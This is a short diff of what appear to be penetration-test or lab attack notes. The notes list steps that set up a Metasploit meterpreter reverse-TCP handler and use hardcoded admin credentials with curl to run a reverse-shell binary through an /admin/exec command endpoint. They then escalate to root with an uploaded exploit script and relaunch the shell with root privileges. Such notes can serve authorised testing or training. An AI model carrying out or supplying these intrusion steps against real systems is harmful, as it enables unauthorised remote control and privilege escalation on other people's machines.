@@ -1760,7 +1760,8 @@ tcp   LISTEN    0      128             [::]:2222          [::]:*
 		- msfconsole
 			- setup handler using the linux/x64/meterpreter/reverse_tcp payload listining on 0.0.0.0:1111
 		- curl
-			- curl -u admin:adminadmin http://20.30.40.150:8080/admin/exec?cmd='bash%20-c%20/home/foothold/rev
+			- from the analyst workstation, run"curl -u admin:adminadmin http://20.30.40.150:8080/admin/exec?cmd='bash%20-c%20/home/foothold/rev"
 - Escalate privileges using the uploaded Copy-Fail exploit
 	- python3 /home/foothold/cf2.py
+		- After obtaining root, execute the reverse tcp shell again to elevate the meterpreter shell's permissions
 ?? what is the context of the login ??
